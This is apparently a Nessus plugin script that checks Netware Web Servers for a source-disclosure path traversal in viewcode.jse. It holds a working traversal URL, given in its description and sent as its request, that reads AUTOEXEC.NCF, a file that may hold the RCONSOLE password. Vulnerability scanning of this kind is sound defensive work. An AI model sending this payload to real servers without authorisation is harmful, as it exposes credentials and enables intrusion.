#
# This script was written by David Kyger <david_kyger@symantec.com>
#
# See the Nessus Scripts License for details
#

if(description)
{
  script_id(12048);
  script_version ("$Revision: 1.5 $");
# script_bugtraq_id();
# script_cve_id("");

 name["english"] = "Netware Web Server Sample Page Source Disclosure";
 script_name(english:name["english"]);
 
 desc["english"] = "
On a Netware Web Server, viewcode.jse allows the source code of web pages to 
be viewed. As an argument, a URL is passed to sewse.nlm. The URL can be 
altered and will permit files outside of the web root to be viewed. 
As a result, sensitive information could be obtained from the Netware server, 
such as the RCONSOLE password located in AUTOEXEC.NCF.

Example: http://target//lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf


Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for Netware Web Server Source Disclosure";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2002 David Kyger");
 family["english"] = "Netware";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

warning = string("
On a Netware Web Server, viewcode.jse allows the source code of web pages to 
be viewed. As an argument, a URL is passed to sewse.nlm. The URL can be 
altered and will permit files outside of the web root to be viewed. 
As a result, sensitive information could be obtained from the Netware server, 
such as the RCONSOLE password located in AUTOEXEC.NCF.



The content of the AUTOEXEC.NCF follows:");

url = "/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf";
 
port = get_http_port(default:80);

 
if(get_port_state(port))
 {
   req = http_get(item:url, port:port);
   buf = http_keepalive_send_recv(port:port, data:req);
   if ("AUTOEXEC.NCF" >< buf)
    {
     warning = warning + string("\n", buf) + "

See also : http://www.securityfocus.com/archive/1/246358
Solution : Remove sample NLMs and default files from the web server. 
Also, ensure the RCONSOLE password is encrypted and utilize a password 
protected screensaver for console access.
Risk factor : High";
     security_hole(port:port, data:warning);
    }
 }


